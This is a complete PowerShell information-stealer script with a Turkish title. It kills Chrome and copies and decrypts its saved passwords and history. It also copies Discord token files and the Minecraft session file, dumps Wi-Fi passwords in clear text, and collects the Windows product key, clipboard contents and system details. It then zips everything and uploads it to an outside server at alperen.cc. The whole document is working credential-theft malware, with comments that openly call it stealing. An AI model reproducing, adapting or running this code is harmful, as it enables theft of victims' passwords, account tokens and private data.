#-- Gelişmiş Bilgi Toplama Script'i (Discord, Minecraft, Clipboard, Windows Key, Cihaz Bilgisi) --#

# Set destination directory for storing data
$destDir = "$env:APPDATA\BrowserData"
if (-Not (Test-Path $destDir)) {
    New-Item -ItemType Directory -Path $destDir
}

# Function to copy browser files
function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
    $browserDestDir = Join-Path -Path $destDir -ChildPath $browserName
    if (-Not (Test-Path $browserDestDir)) {
        New-Item -ItemType Directory -Path $browserDestDir
    }

    foreach ($file in $filesToCopy) {
        $source = Join-Path -Path $browserDir -ChildPath $file
        if (Test-Path $source) {
            Copy-Item -Path $source -Destination $browserDestDir
            Write-Host "$browserName - File copied: $file"
        } else {
            Write-Host "$browserName - File not found: $file"
        }
    }
}

# Function to kill browser processes
function KillBrowserProcesses($browserName) {
    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
    foreach ($process in $processes) {
        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
        Write-Host "Killing process: $browserName with ID: $($process.Id)"
    }
}

# Get list of all profiles for Chrome
$chromeUserDataDir = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$profiles = Get-ChildItem -Path $chromeUserDataDir -Filter "Default*" -Directory

foreach ($profile in $profiles) {
    $profileName = $profile.Name
    $profileDir = $profile.FullName

    Write-Host "Processing Chrome Profile: $profileName"

    # Kill Chrome processes
    KillBrowserProcesses "chrome"

    # Copy the necessary files (Login Data, History, etc.)
    $filesToCopy = @("Login Data", "History", "Local State")
    CopyBrowserFiles $profileName $profileDir $filesToCopy

    # If Local State exists, copy it
    $localStateFile = Join-Path -Path $chromeUserDataDir -ChildPath "Local State"
    if (Test-Path $localStateFile) {
        Copy-Item -Path $localStateFile -Destination (Join-Path -Path $destDir -ChildPath $profileName) -ErrorAction SilentlyContinue
        Write-Host "$profileName - Local State file copied."
    }

    # Decrypt the Login Data if decrypt.exe is available
    $decryptExePath = Join-Path -Path "$destDir\$profileName" -ChildPath "decrypt.exe"
    $loginDataPath = Join-Path -Path "$destDir\$profileName" -ChildPath "Login Data"
    $localStatePath = Join-Path -Path "$destDir\$profileName" -ChildPath "Local State"
    
    $outputPath = Join-Path -Path $destDir -ChildPath "decrypted_$profileName.txt"
    
    if (Test-Path $decryptExePath) {
        if (Test-Path $loginDataPath -and Test-Path $localStatePath) {
            # Run the decrypt.exe with specified parameters and capture output
            $result = & $decryptExePath $loginDataPath $localStatePath $outputPath 2>&1
            Write-Host "Decrypt.exe output for ${profileName}: $($result)"  # Hata düzeltildi

            if (Test-Path $outputPath) {
                Write-Host "$profileName - Decrypted passwords saved to: $outputPath"
            } else {
                Write-Host "$profileName - Decrypted passwords not found."
            }

            # Delete decrypt.exe after use
            try {
                Remove-Item $decryptExePath -Force -ErrorAction Stop
                Write-Host "$profileName - decrypt.exe deleted to reduce size."
            } catch {
                Write-Host "$profileName - decrypt.exe could not be deleted: $_"
            }
        } else {
            Write-Host "$profileName - Login Data or Local State not found."
        }
    } else {
        Write-Host "$profileName - decrypt.exe not found."
    }
}

# Discord token stealing
$discordPaths = @(
    "$env:APPDATA\Discord\Local Storage\leveldb",
    "$env:LOCALAPPDATA\Discord\Local Storage\leveldb"
)
$discordDestDir = Join-Path -Path $destDir -ChildPath "Discord"
if (-Not (Test-Path $discordDestDir)) {
    New-Item -ItemType Directory -Path $discordDestDir
}

foreach ($path in $discordPaths) {
    if (Test-Path $path) {
        Copy-Item -Path "$path\*" -Destination $discordDestDir -Recurse -Force
        Write-Host "Copied Discord token files from $path"
    } else {
        Write-Host "Discord token path not found: $path"
    }
}

# Minecraft session stealing
$minecraftPath = "$env:APPDATA\.minecraft\launcher_profiles.json"
$minecraftDestDir = Join-Path -Path $destDir -ChildPath "Minecraft"
if (-Not (Test-Path $minecraftDestDir)) {
    New-Item -ItemType Directory -Path $minecraftDestDir
}

if (Test-Path $minecraftPath) {
    Copy-Item -Path $minecraftPath -Destination $minecraftDestDir
    Write-Host "Minecraft session file copied."
} else {
    Write-Host "Minecraft session file not found."
}

# Stealing Wi-Fi passwords
$wifiDestDir = Join-Path -Path $destDir -ChildPath "WiFiPasswords"
if (-Not (Test-Path $wifiDestDir)) {
    New-Item -ItemType Directory -Path $wifiDestDir
}

$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.Line.Split(":")[1].Trim() }
foreach ($profile in $wifiProfiles) {
    $wifiInfo = netsh wlan show profile name="$profile" key=clear
    $wifiInfo | Out-File -FilePath (Join-Path -Path $wifiDestDir -ChildPath "$profile.txt")
    Write-Host "Wi-Fi password saved for profile: $profile"
}

# Collecting Windows License Key
$windowsKeyDest = Join-Path -Path $destDir -ChildPath "WindowsKey.txt"
$windowsKey = (Get-WmiObject -query 'select * from SoftwareLicensingService').OA3xOriginalProductKey
$windowsKey | Out-File -FilePath $windowsKeyDest
Write-Host "Windows key saved."

# Collecting Clipboard Data
$clipboardData = Get-Clipboard
$clipboardFile = Join-Path -Path $destDir -ChildPath "ClipboardData.txt"
$clipboardData | Out-File -FilePath $clipboardFile
Write-Host "Clipboard data saved."

# Collecting System Info
$systemInfo = Get-ComputerInfo
$systemInfoFile = Join-Path -Path $destDir -ChildPath "SystemInfo.txt"
$systemInfo | Out-File -FilePath $systemInfoFile
Write-Host "System info saved."

# Collecting Installed Software
$installedPrograms = Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
$installedProgramsFile = Join-Path -Path $destDir -ChildPath "InstalledPrograms.txt"
$installedPrograms | Out-File -FilePath $installedProgramsFile
Write-Host "Installed software list saved."

# Collecting Network Configuration
$networkConfig = Get-NetIPConfiguration
$networkConfigFile = Join-Path -Path $destDir -ChildPath "NetworkConfig.txt"
$networkConfig | Out-File -FilePath $networkConfigFile
Write-Host "Network configuration saved."

# Compress the entire BrowserData directory into a ZIP file
$zipDir = "$env:APPDATA\ZippedBrowserData"
if (-Not (Test-Path $zipDir)) {
    New-Item -ItemType Directory -Path $zipDir
}

$folderPath = $destDir
$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"

if (Test-Path $zipFilePath) {
    Remove-Item $zipFilePath -Force
}

Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath

# Upload the ZIP file to a PHP server
$url = "https://alperen.cc/uploadd.php"
if (Test-Path $zipFilePath) {
    try {
        $boundary = [System.Guid]::NewGuid().ToString("N")
        $contentType = "multipart/form-data; boundary=$boundary"

        $fileName = [System.IO.Path]::GetFileName($zipFilePath)
        $fileContent = [System.IO.File]::ReadAllBytes($zipFilePath)
        $encodedFile = [Convert]::ToBase64String($fileContent)

        $fileUploadData = @"
--$boundary
Content-Disposition: form-data; name="file"; filename="$fileName"
Content-Type: application/zip

$encodedFile
--$boundary--
"@

        $httpClient = New-Object System.Net.Http.HttpClient
        $httpClient.DefaultRequestHeaders.Add("User-Agent", "Mozilla/5.0")
        $response = $httpClient.PostAsync($url, [System.Net.Http.StringContent]::new($fileUploadData, [System.Text.Encoding]::UTF8, $contentType)).Result

        if ($response.IsSuccessStatusCode) {
            Write-Host "File uploaded successfully."
        } else {
            Write-Host "File upload failed. Status code: $($response.StatusCode)"
        }
    } catch {
        Write-Host "Error uploading file: $_"
    }
} else {
    Write-Host "ZIP file not found for upload."
}
